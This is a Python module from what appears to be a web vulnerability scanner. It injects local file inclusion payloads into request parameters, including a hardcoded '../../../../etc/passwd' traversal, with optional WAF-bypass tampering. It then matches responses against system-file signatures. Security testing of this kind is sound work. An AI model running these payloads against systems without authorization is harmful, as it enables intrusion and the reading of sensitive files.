import re
from .tampering import apply_tampering

LFI_SIGS = [r"root:x:0:0:", r"\[extensions\]", r"daemon:x:", r"\[fonts\]", r"Administrator:.*:500:", r"nginx:"]

def load_payloads_from_file(filename="payloads/lfi.txt"):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except Exception: 
        return ["../../../../etc/passwd"]

def run_lfi_test(engine, point, param_name, level, bypass, waf_name=None):
    url = point['url']
    method = point['method']
    payloads = load_payloads_from_file()

    for payload in payloads:
        final_payload = apply_tampering(payload, 'lfi', bypass, waf_name)
        
        data = {p: 'x' for p in point['parameters']} if method == 'POST' else None
        params = {p: 'x' for p in point['parameters']} if method == 'GET' else None
        
        if method == 'POST': data[param_name] = final_payload
        else: params[param_name] = final_payload

        resp = engine._send_request(url, method=method, data=data, params=params)
        
        if resp is not None:
            for sig in LFI_SIGS:
                if re.search(sig, resp.text):
                    engine.add_vulnerability("LFI", url, final_payload, f"Signature: {sig}", parameter=param_name)
                    break
